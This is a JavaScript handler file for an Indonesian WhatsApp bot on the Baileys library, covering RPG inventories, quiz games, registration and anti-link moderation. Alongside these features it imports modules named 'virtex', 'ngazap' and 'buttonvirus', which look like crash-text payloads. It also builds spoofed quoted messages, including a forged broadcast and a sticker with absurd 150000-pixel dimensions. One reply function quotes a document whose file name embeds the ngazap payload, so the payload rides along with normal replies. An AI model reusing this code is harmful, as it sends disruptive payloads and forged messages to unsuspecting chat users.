require('./rikikw')
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@adiwajshing/baileys')
const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const { exec, spawn, execSync } = require("child_process")
const axios = require('axios')
const path = require('path')
const os = require('os')
const ms = require('ms')
const { ngazap } = require('./rikilah/virtex/ngazap')
const { virtex7 } = require('./rikilah/virtex/virtex7')
const { buttonvirus } = require('./rikilah/virtex/buttonvirus')
const { virtex } = require('./rikilah/virtex/virtex2')
const { virtex2 } = require('./rikilah/virtex/virtex2')
const { virtex3 } = require('./rikilah/virtex/virtex3')
const { virtex4 } = require('./rikilah/virtex/virtex4')
const { virtex5 } = require('./rikilah/virtex/virtex5')
const { virtex6 } = require('./rikilah/virtex/virtex6')
const { virtex8 } = require('./rikilah/virtex/virtex8')
const { virtex9 } = require('./rikilah/virtex/virtex9')
const { virtag } = require('./rikilah/virtex/virtag')
const { emoji2 } = require('./rikilah/virtex/emoji2')
const _sewa = require('./rikilah/lib/sewa')
const hx = require('hxz-api')
const cl = require('caliph-api') 
const crypto = require('crypto')
const { TiktokDownloader } = require('./rikilah/lib/tiktokdl')
const { getRegisteredRandomId, addRegisteredUser, checkRegisteredUser } = require('./rikilah/lib/register') 
const mel = require('kitsune-api')
const Jimp = require('jimp')
const moment = require('moment-timezone')
const { JSDOM } = require('jsdom')
const google = require('google-it')
const mathjs = require('mathjs')
const speed = require('performance-now')
const { performance } = require('perf_hooks')
const { Primbon } = require('scrape-primbon')
const primbon = new Primbon()
const { smsg, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, getGroupAdmins } = require('./rikilah/lib/myfunc')
const { FajarNews, BBCNews, metroNews, CNNNews, iNews, KumparanNews, TribunNews, DailyNews, DetikNews, OkezoneNews, CNBCNews, KompasNews, SindoNews, TempoNews, IndozoneNews, AntaraNews, RepublikaNews, VivaNews, KontanNews, MerdekaNews, KomikuSearch, AniPlanetSearch, KomikFoxSearch, KomikStationSearch, MangakuSearch, KiryuuSearch, KissMangaSearch, KlikMangaSearch, PalingMurah, LayarKaca21, AminoApps, Mangatoon, WAModsSearch, Emojis, CoronaInfo, JalanTikusMeme,Cerpen, Quotes, Couples, Darkjokes } = require("dhn-api");
//=================================================//
const content = JSON.stringify(m.message)
//=================================================//
//RPG FUNCTION
const { 
addInventoriDarah,cekDuluJoinAdaApaKagaDiJson,addDarah,kurangDarah, getDarah 
}= require('./src/darah.js')
const { 
cekInventoryAdaAtauGak,addInventori, addBesi, addEmas, addEmerald,addUmpan,addPotion,kurangBesi, kurangEmas, kurangEmerald, kurangUmpan,kurangPotion,getBesi, getEmas, getEmerald, getUmpan, getPotion
} = require('./src/alat_tukar.js')
const {addInventoriMonay,cekDuluJoinAdaApaKagaMonaynyaDiJson,addMonay,kurangMonay, getMonay 
} = require('./src/monay.js')
const { addInventoriLimit, cekDuluJoinAdaApaKagaLimitnyaDiJson, addLimit, kurangLimit, getLimit 
} = require('./src/limit.js')
const { cekDuluHasilBuruanNya, addInventoriBuruan, addIkan, addAyam,addKelinci,addDomba,addSapi, addGajah, kurangIkan, kurangAyam,kurangKelinci,kurangDomba,kurangSapi, kurangGajah, getIkan, getAyam,getKelinci,getDomba,getSapi, getGajah
} = require('./src/buruan.js')
let DarahAwal =global.rpg.darahawal
const isDarah = cekDuluJoinAdaApaKagaDiJson(m.sender)
const isCekDarah = getDarah(m.sender)
const isUmpan = getUmpan(m.sender)
const isPotion = getPotion(m.sender)
const isIkan = getIkan(m.sender)
const isAyam = getAyam(m.sender)
const isKelinci = getKelinci(m.sender)
const isDomba = getDomba(m.sender)
const isSapi = getSapi(m.sender)
const isGajah = getGajah(m.sender)
const isMonay = getMonay(m.sender)
const isLimit = getLimit(m.sender)
const isBesi = getBesi(m.sender)
const isEmas = getEmas(m.sender)
const isEmerald = getEmerald(m.sender)
const isInventory = cekInventoryAdaAtauGak(m.sender)
const isInventoriBuruan = cekDuluHasilBuruanNya(m.sender)
const isInventoryLimit = cekDuluJoinAdaApaKagaLimitnyaDiJson(m.sender)
const isInventoryMonay = cekDuluJoinAdaApaKagaMonaynyaDiJson(m.sender)
const ikan = ['🐟','🐠','🐡']
//=================================================//
//rpg database\\
let _buruan = JSON.parse(fs.readFileSync('./src/hasil_buruan.json'));
let _darahOrg = JSON.parse(fs.readFileSync('./src/darah.json'))
//=================================================//
const _registered = JSON.parse(fs.readFileSync('./rikilah/Database/registered.json'));
const register = JSON.parse(fs.readFileSync('./rikilah/Database/register.json'));
//=================================================//
const prem = JSON.parse(fs.readFileSync('./rikilah/Database/premium.json'))
const sewa = JSON.parse(fs.readFileSync('./rikilah/Database/sewa.json'))
// prem dan sewa
let tebaklagu = db.data.game.tebaklagu = []
let _family100 = db.data.game.family100 = []
let kuismath = db.data.game.math = []
let tebakgambar = db.data.game.tebakgambar = []
let tebakkata = db.data.game.tebakkata = []
let caklontong = db.data.game.lontong = []
let caklontong_desk = db.data.game.lontong_desk = []
let tebakkalimat = db.data.game.kalimat = []
let tebaklirik = db.data.game.lirik = []
let tebaktebakan = db.data.game.tebakan = []
let vote = db.data.others.vote = []
const kalimage = fs.readFileSync ('./rikilah/image/rikgans.jpg')
const thumbnail = fs.readFileSync ('./rikilah/image/mamak.jpg')
const { mediafireDl } = require('./rikilah/lib/mediafire.js')
const banned = JSON.parse(fs.readFileSync('./rikilah/dbnye/banned.json'))
const ntilink = JSON.parse(fs.readFileSync("./rikilah/lib/antilink.json"))
//=================================================//
// Function
const cerpen = require('./rikilah/lib/cerpen')
wm = '𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳'
//=================================================//
// Time & Date
const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
if(time2 < "23:59:00"){
var ucapanWaktu = 'Selamat Malam'
}
if(time2 < "19:00:00"){
var ucapanWaktu = 'Selamat Petang'
 }
if(time2 < "18:00:00"){
var ucapanWaktu = 'Selamat Sore'
 }
if(time2 < "15:00:00"){
var ucapanWaktu = 'Selamat Siang'
 }
if(time2 < "11:00:00"){
var ucapanWaktu = 'Selamat Pagi'
 }
if(time2 < "05:00:00"){
var ucapanWaktu = 'Selamat Malam'
 }
const time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')
const wita = moment(Date.now()).tz('Asia/Makassar').locale('id').format('HH:mm:ss z')
const wit = moment(Date.now()).tz('Asia/Jayapura').locale('id').format('HH:mm:ss z')
const salam = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
const qtod = m.quoted? "true":"false"
// Date
moment.tz.setDefault("Asia/Jakarta").locale("id");
//=================================================//
module.exports = rikibos = async (rikibos, m, chatUpdate, store) => {
 try {
 var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
var budy = (typeof m.text == 'string' ? m.text : '')
var prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
//=================================================//
const isCmd = body.startsWith(prefix)
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const pushname = m.pushName || "No Name"
const botNumber = await rikibos.decodeJid(rikibos.user.id)
const isCreator = [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const itsMe = m.sender == botNumber ? true : false
const text = q = args.join(" ")
const isBan = banned.includes(m.sender)
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const isMedia = /image|video|sticker|audio/.test(mime)
const from = mek.key.remoteJid
const isRegistered = checkRegisteredUser(m.sender)
const isSewa = _sewa.checkSewaGroup(from, sewa)
//=================================================//
// Total Chat
//=================================================//
//=================================================//
// Group
const groupMetadata = m.isGroup ? await rikibos.groupMetadata(m.chat).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
const isPrem = prem.includes(sender)
const welcm = m.isGroup ? wlcm.includes(from) : false
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const isPremium = isCreator || global.premium.map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender) || false
const isGroupAdmins = groupAdmins.includes(sender) || false
const AntiLink = m.isGroup ? ntilink.includes(from) : false 
const AntiNsfw = m.isGroup ? ntnsfw.includes(from) : false
const AntiNsfww = m.isGroup ? ntnsfww.includes(from) : false
//=================================================//
// Random Image Simple Menu
let picaks = [flaming,fluming,flarun,flasmurf]
let picak = picaks[Math.floor(Math.random() * picaks.length)]
//document randomizer
   //randoming function
function pickRandom(list) {
return list[Math.floor(list.length * Math.random())]
}
let documents = [doc1,doc2,doc3,doc4,doc5,doc6]
let docs = pickRandom(documents)
//=================================================//
async function replyPremium(teks) {
                       const buttonsDefault = [
	             		{ urlButton: { displayText: `𝐎𝐖𝐍𝐄𝐑`, url : `${wame}` } },
	             		{ quickReplyButton: { displayText : `𝐁𝐔𝐘 𝐏𝐑𝐄𝐌𝐈𝐔𝐌`, id : `buypremium` } }
                                        	  ]                 
                       const buttonMessage = { 
                                    text: teks, 
                                    footer: "𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳", 
                                    templateButtons: buttonsDefault, 
                                    image: {url: thumb}                                   
                                               }
                       return rikibos.sendMessage(from, buttonMessage)
                }
                
                async function replyNya(teks) {
                       const buttonsDefault = []                 
                       const buttonMessage = { 
                                    text: teks, 
                                    footer: "© 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳 𝟐𝟐", 
                                    templateButtons: buttonsDefault, 
                                    image: {url: thumb}                                   
                                               }
                       return rikibos.sendMessage(from, buttonMessage)
                }
                
                _sewa.expiredCheck(rikibos, sewa)

const rik = { 
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "12042285575-1488847308@g.us" } : {}) 
},
"message": {
"extendedTextMessage": {
"text": "© 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳 ✓️",
"previewType": "NONE",
"contextInfo": {
"stanzaId": "3EB0382EDBB2",
"participant": "6287741097274@s.whatsapp.net"
}}}}
//=================================================//
var createSerial = (size) => {
return crypto.randomBytes(size).toString('hex').slice(0, size)
}

		try {
        ppuser = await rikibos.profilePictureUrl(m.sender, 'image')
        } catch (err) {
        ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
        }
        ppnyauser = await getBuffer(ppuser)

const generateProfilePicture = async(buffer) => {
const jimp_1 = await jimp.read(buffer);
const resz = jimp_1.getWidth() > jimp_1.getHeight() ? jimp_1.resize(550, jimp.AUTO) : jimp_1.resize(jimp.AUTO, 650)
const jimp_2 = await jimp.read(await resz.getBufferAsync(jimp.MIME_JPEG));
return {
img: await resz.getBufferAsync(jimp.MIME_JPEG)
}
}

        const sendFileFromUrl = async (from, url, caption, m, men) => {
            let mime = '';
            let res = await axios.head(url)
            mime = res.headers['content-type']
            if (mime.split("/")[1] === "gif") {
                return rikibos.sendMessage(from, { video: await getBuffer(url), caption: caption, gifPlayback: true, mentions: men ? men : [], mimetype: 'video/mp4'}, {quoted: m})
                }
            let type = mime.split("/")[0]+"Message"
            if(mime === "application/pdf"){
                return rikibos.sendMessage(m.chat, { document: await getBuffer(url), mimetype: 'application/pdf', caption: caption, mentions: men ? men : []}, {quoted: m })
            }
            if(mime.split("/")[0] === "image"){
                return rikibos.sendMessage(m.chat, { image: await getBuffer(url), caption: caption, mentions: men ? men : []}, {quoted: m})
            }
            if(mime.split("/")[0] === "video"){
                return rikibos.sendMessage(m.chat, { video: await getBuffer(url), caption: caption, mentions: men ? men : [], mimetype: 'video/mp4'}, {quoted: m })
            }
            if(mime.split("/")[0] === "audio"){
                return rikibos.sendMessage(m.chat, { audio: await getBuffer(url), caption: caption, mentions: men ? men : [], mimetype: 'audio/mpeg'}, {quoted: m })
            }
        }
	        
        if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.data.sticker)) {
        let hash = global.db.data.sticker[m.msg.fileSha256.toString('base64')]
        let { text, mentionedJid } = hash
        let messages = await generateWAMessage(m.chat, { text: text, mentions: mentionedJid }, {
            userJid: rikibos.user.id,
            quoted: m.quoted && m.quoted.fakeObj
        })
        messages.key.fromMe = areJidsSameUser(m.sender, rikibos.user.id)
        messages.key.id = m.key.id
        messages.pushName = m.pushName
        if (m.isGroup) messages.participant = m.sender
        let msg = {
            ...chatUpdate,
            messages: [proto.WebMessageInfo.fromObject(messages)],
            type: 'append'
        }
        rikibos.ev.emit('messages.upsert', msg)
        }

const fakerikibang = {
  key: {
    fromMe: false,
    participant: '0@s.whatsapp.net',
    remoteJid: 'status@broadcast'
  },
  message: {
    imageMessage: {
      mimetype: 'image/jpeg',
      caption: 'RIK - OHHz',
      viewOnce: true
    }
  }
}

const lep = {
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
message: { 
"imageMessage": { 
"mimetype": "image/jpeg", 
"caption": `Kok Fc Bang`, 
"jpegThumbnail": ppnyauser
}
}
}

const kal = { 
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "@s.whatsapp.net" } : {}) 
},
"message": {
"extendedTextMessage": {
"text": "© 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳 ✓️",
"previewType": "NONE",
"contextInfo": {
"stanzaId": "3EB0382EDBB2",
"participant": "@s.whatsapp.net"
}}}}
//=================================================//
const kel = { 
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "@s.whatsapp.net" } : {}) 
},
"message": {
"stickerMessage": {
"url": "https://mmg.whatsapp.net/d/f/ApPRbzvidZuNpHcHsCn2P1rVHawvt2T63DCZMyWnAgQZ.enc",
"fileSha256": "czwy7lIUZuU8GL9W2UP3sSo/vy9FlETMpqpQneQQ+w8=",
"fileEncSha256": "xOjP90WLzICVTQQvj7Ts+oJvcxhas5oOEPMvoqKVQ1E=",
"mediaKey": "/j2BjzjS/e88MHVCcaS8f3kaSCAVe18Nv4tQb/rZtrc=",
"mimetype": "image/webp",
"directPath": "/v/t62.7118-24/25076345_285509236738530_1931711252260953768_n.enc?ccb=11-4&oh=f6ef4b023e7424d5d2c4d03923c0ab1b&oe=616F03EF",
"height": 150000,
"width": 150000,
"fileLength": "10124",
"mediaKeyTimestamp": "1632147575",
"isAnimated": false
}}}
//=================================================//
const trolii = {
	key : {
   participant : '0@s.whatsapp.net'
                        },
       message: {
                    orderMessage: {
                            itemCount : 123,
                            status: 1,
                            surface : 1,
                            message: `${pushname}`, //Kasih namalu
                            orderTitle: `${pushname}`,
                            thumbnail: log0, //Gambarnye
                            sellerJid: '0@s.whatsapp.net' 
                          }
                        }
                      }
const doc = { 
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "@s.whatsapp.net" } : {}) 
},
"message": {
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/Ao-LpakpZ8JjFGz4skkurYum29b6Q1YPugTEBTAUkhfE.enc",
"mimetype": "application/msword",
"title": "𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳",
"fileSha256": "k0tpoRSf/e9AqL1vH2AhxOtqOkJJWz9s2DM7vnuylcQ=",
"fileLength": "64455",
"pageCount": 1,
"mediaKey": "S6WPcsH25ggZ4tDI813ZocjDm2rc+UPBgaCc+vcw0vo=",
"fileName": `𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳${ngazap(prefix)}`,
"fileEncSha256": "tpHJ7AgNj61qLebHRonqtpkxphMviV13IprX63dHM64="
}}}
//=================================================//
const riki = { 
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "120363042285039849@g.us" } : {}) 
},
"message": {
"extendedTextMessage": {
"previewType": "NONE",
"contextInfo": {
"stanzaId": "3EB0382EDBB2",
"participant": "6287741097274@s.whatsapp.net"
}}}}
//=================================================//
const bal= (teks) => {
rikibos.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": `𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳 ${ngazap(prefix)}`,"body": `𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳 ${ngazap(prefix)}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": kalimage,"sourceUrl": `https://www.instagram.com/ryarllh_01/`}}}, { quoted: doc })
} 
const bangkal= (teks) => {
rikibos.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": `𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳`,"body": `Selamat ${salam} kak ${pushname}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": kalimage,"sourceUrl": `https://www.instagram.com/ryarllh_01/`}}}, { quoted: rik })
} 
// Target
const reply = (teks) => {
return rikibos.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": `𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳`,"body": `Selamat ${salam} kak ${pushname}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": kalimage,"sourceUrl": `https://www.instagram.com/ryarllh_01/`}}}, { quoted: rik })
} 
//=================================================//
 //Resize Location
 	const reSize = async(buffer, ukur1, ukur2) => {
return new Promise(async(resolve, reject) => {
var obz = await Jimp.read(buffer);
var ab = await obz.resize(ukur1, ukur2).getBufferAsync(Jimp.MIME_JPEG)
resolve(ab)
 })
}	
//=================================================//
try {
let isNumber = x => typeof x === 'number' && !isNaN(x)
let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
let user = global.db.data.users[m.sender]
if (typeof user !== 'object') global.db.data.users[m.sender] = {}
if (user) {
if (!isNumber(user.afkTime)) user.afkTime = -1
if (!('afkReason' in user)) user.afkReason = ''
if (!isNumber(user.limit)) user.limit = limitUser
} else global.db.data.users[m.sender] = {
afkTime: -1,
afkReason: '',
limit: limitUser,
}
let chats = global.db.data.chats[m.chat]
if (typeof chats !== 'object') global.db.data.chats[m.chat] = {}
if (chats) {
if (!('mute' in chats)) chats.mute = false
} else global.db.data.chats[m.chat] = {
mute: false,
}
let setting = db.data.settings[botNumber]
if (typeof setting !== 'object') db.data.settings[botNumber] = {}
if (setting) {
if (!isNumber(setting.status)) setting.status = 0
if (!('templateImage' in setting)) setting.templateImage = true
if (!('templateVideo' in setting)) setting.templateVideo = false
if (!('templateGif' in setting)) setting.templateGif = false
if (!('templateDocument' in setting)) setting.templateDocument = false
} else db.data.settings[botNumber] = {
status: 0,
templateImage: true,
templateVideo: false,
templateGif: false,
templateDocument: false,
}
let settings = db.data.settings[botNumber]
if (typeof settings !== 'object') db.data.settings[botNumber] = {}
if (settings) {
if (!('available' in settings)) settings.available = false
if (!('composing' in settings)) settings.composing = false
if (!('recording' in settings)) settings.recording = false
} else db.data.settings[botNumber] = {
available: false,
composing: false,
recording: false,
}
} catch (err) {
console.log(err)
}
//=================================================//
async function replyReg(teks) {
const buttonsDefault = [{ quickReplyButton: { displayText: ` ꪶ VERIFY ꫂ `, id: `${prefix}verify` } }]                 
const buttonMessage = { 
text: teks, 
footer: "⚞ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳 ꪶ𖣂ꫂ", 
templateButtons: buttonsDefault, 
image: {url: ppnyauser}                                   
}
return rikibos.sendMessage(from, buttonMessage)
}

async function sendButRegis(from) {
var serialUser = createSerial(18)
_registered.push(sender)
fs.writeFileSync('./rikilah/Database/registered.json', JSON.stringify(_registered))
addRegisteredUser(sender, serialUser)
var button = [
{ quickReplyButton: { displayText: `Menu`, id: `${prefix}menu` } }
]
var anj = `「 *PENDAFTARAN USER* 」
*Terimakasih Sudah Mendaftarkan Diri Dalam Database Bot WhatsApp*

*🌹 Nama :* ${pushname}
*🌹 API :* +${sender.split('@')[0]}
*🌹 Serial:* ${serialUser}
*🌹 Total:* ${_registered.length} Pengguna`
rikibos.sendMessage(from, { caption: anj, location: { jpegThumbnail: log0 }, templateButtons: button, footer: `⚞ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳`, mentions: [m.sender] })
.catch ((err) => reply(err))
}

// Public & Self
if (!rikibos.public) {
if (!m.key.fromMe) return
}
//console
if (m.message) {
console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32m CMD \x1b[1;37m]', time, chalk.
green(budy || m.mtype), 'from', chalk.green(pushname), 'in', chalk.green(groupName ? groupName : 'Private Chat' ), 'args :', chalk.green(text.length))
 }
//=================================================// 
// reset limit every 12 hours
let cron = require('node-cron')
cron.schedule('00 12 * * *', () => {
let user = Object.keys(global.db.data.users)
let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
for (let jid of user) global.db.data.users[jid].limit = limitUser
console.log('Reseted Limit')
}, {
scheduled: true,
timezone: "Asia/Jakarta"
})
//=================================================// 
var sticWait = (hehe) => {
ano = fs.readFileSync('./rikilah/stickernye/wait.webp')
rikibos.sendImageAsSticker(m.chat, ano, m, { packname: global.packname, author: global.author })
}
var sticAdmin = (hehe) => {
ano = fs.readFileSync('./rikilah/stickernye/BotAdman.webp')
rikibos.sendImageAsSticker(m.chat, ano, m, { packname: global.packname, author: global.author })
}
var sticOwner = (hehe) => {
ano = fs.readFileSync('./rikilah/stickernye/owner.webp')
rikibos.sendImageAsSticker(m.chat, ano, m, { packname: global.packname, author: global.author })
}
var sticSukses = (hehe) => {
ano = fs.readFileSync('./rikilah/stickernye/SuksesCok.webp')
rikibos.sendImageAsSticker(m.chat, ano, m, { packname: global.packname, author: global.author })
}
var sticBanLu = (hehe) => {
ano = fs.readFileSync('./rikilah/stickernye/BanLu.webp')
rikibos.sendImageAsSticker(m.chat, ano, m, { packname: global.packname, author: global.author })
}
var groupon = (hehe) => {
ano = fs.readFileSync('./rikilah/stickernye/groupon.webp')
rikibos.sendImageAsSticker(m.chat, ano, m, { packname: global.packname, author: global.author })
}
var SiGroupadmin = (hehe) => {
ano = fs.readFileSync('./rikilah/stickernye/SiGroupadmin.webp')
rikibos.sendImageAsSticker(m.chat, ano, m, { packname: global.packname, author: global.author })
}
//=================================================//
antidelete = true

if(autorecording){
if(autorecording == false)
await rikibos.sendPresenceUpdate('recording', m.chat)
} else if(autoketik){
if(autoketik == false)
await rikibos.sendPresenceUpdate('composing', m.chat)
} else if(available){
if(available == false)
await rikibos.sendPresenceUpdate('available', m.chat)
}
//=================================================//
// Mute Chat
if (db.data.chats[m.chat].mute && !isAdmins && !isCreator) {
return
}
//=================================================//

//=================================================//
// AntiLink
if (AntiLink) {
linkgce = await rikibos.groupInviteCode(from)
if (budy.includes(`https://chat.whatsapp.com/${linkgce}`)) {
m.reply(`\`\`\`「 Detect Link 」\`\`\`\n\nAnda tidak akan dikick bot karena yang anda kirim adalah link group yg ada di group ini`)
} else if (isUrl(m.text)) {
bvl = `\`\`\`「 Detect Link 」\`\`\`\n\nAdmin telah mengirim link, admin dibebaskan untuk mengirim link apapun`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (isCreator) return m.reply(bvl)
kice = m.sender
await rikibos.groupParticipantsUpdate(m.chat, [kice], 'remove').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
rikibos.sendMessage(from, {text:`\`\`\`「 Detect Link 」\`\`\`\n\n@${kice.split("@")[0]} Telah dikick karena send link di group ini`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
} else {
}
}
//=================================================//
// Respon Cmd with media
if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.data.sticker)) {
let hash = global.db.data.sticker[m.msg.fileSha256.toString('base64')]
let { text, mentionedJid } = hash
let messages = await generateWAMessage(m.chat, { text: text, mentions: mentionedJid }, {
userJid: rikibos.user.id,
quoted: rik.quoted && m.quoted.fakeObj
})
messages.key.fromMe = areJidsSameUser(m.sender, rikibos.user.id)
messages.key.id = m.key.id
messages.pushName = m.pushName
if (m.isGroup) messages.participant = m.sender
let msg = {
...chatUpdate,
messages: [proto.WebMessageInfo.fromObject(messages)],
type: 'append'
}
rikibos.ev.emit('messages.upsert', msg)
}
if (('family100'+m.chat in _family100) && isCmd) {
kuis = true
let room = _family100['family100'+m.chat]
let teks = budy.toLowerCase().replace(/[^\w\s\-]+/, '')
let isSurender = /^((me)?nyerah|surr?ender)$/i.test(m.text)
if (!isSurender) {
let index = room.jawaban.findIndex(v => v.toLowerCase().replace(/[^\w\s\-]+/, '') === teks)
if (room.terjawab[index]) return !0
room.terjawab[index] = m.sender
}
let isWin = room.terjawab.length === room.terjawab.filter(v => v).length
let caption = `
Jawablah Pertanyaan Berikut :\n${room.soal}\n\n\nTerdapat ${room.jawaban.length} Jawaban ${room.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}
${isWin ? `Semua Jawaban Terjawab` : isSurender ? 'Menyerah!' : ''}
${Array.from(room.jawaban, (jawaban, index) => {
return isSurender || room.terjawab[index] ? `(${index + 1}) ${jawaban} ${room.terjawab[index] ? '@' + room.terjawab[index].split('@')[0] : ''}`.trim() : false
}).filter(v => v).join('\n')}
${isSurender ? '' : `Perfect Player`}`.trim()
rikibos.sendText(m.chat, caption, m, { contextInfo: { mentionedJid: parseMention(caption) }}).then(mes => { return _family100['family100'+m.chat].pesan = mesg }).catch(_ => _)
if (isWin || isSurender) delete _family100['family100'+m.chat]
}
if (tebaklagu.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebaklagu[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
await rikibos.sendButtonText(m.chat, [{ buttonId: 'tebak lagu', buttonText: { displayText: 'Tebak Lagu' }, type: 1 }], `🎮 Tebak Lagu 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, rikibos.user.name, m)
delete tebaklagu[m.sender.split('@')[0]]
} else bangkal('*Jawaban Salah!*')
}
if (kuismath.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = kuismath[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
await bangkal(`🎮 Kuis Matematika🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? kirim ${prefix}math mode`)
delete kuismath[m.sender.split('@')[0]]
} else bangkal('*Jawaban Salah!*')
}
if (tebakgambar.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebakgambar[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
await rikibos.sendButtonText(m.chat, [{ buttonId: 'tebak gambar', buttonText: { displayText: 'Tebak Gambar' }, type: 1 }], `🎮 Tebak Gambar 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, rikibos.user.name, m)
delete tebakgambar[m.sender.split('@')[0]]
} else bangkal('*Jawaban Salah!*')
}
if (tebakkata.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebakkata[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
await rikibos.sendButtonText(m.chat, [{ buttonId: 'tebak kata', buttonText: { displayText: 'Tebak Kata' }, type: 1 }], `🎮 Tebak Kata 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, rikibos.user.name, m)
delete tebakkata[m.sender.split('@')[0]]
} else bangkal('*Jawaban Salah!*')
}
if (caklontong.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = caklontong[m.sender.split('@')[0]]
deskripsi = caklontong_desk[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
await rikibos.sendButtonText(m.chat, [{ buttonId: 'tebak lontong', buttonText: { displayText: 'Tebak Lontong' }, type: 1 }], `🎮 Cak Lontong 🎮\n\nJawaban Benar 🎉\n*${deskripsi}*\n\nIngin bermain lagi? tekan button dibawah`, rikibos.user.name, m)
delete caklontong[m.sender.split('@')[0]]
delete caklontong_desk[m.sender.split('@')[0]]
} else bangkal('*Jawaban Salah!*')
}
if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebakkalimat[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
await rikibos.sendButtonText(m.chat, [{ buttonId: 'tebak kalimat', buttonText: { displayText: 'Tebak Kalimat' }, type: 1 }], `🎮 Tebak Kalimat 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, rikibos.user.name, m)
delete tebakkalimat[m.sender.split('@')[0]]
} else bangkal('*Jawaban Salah!*')
}
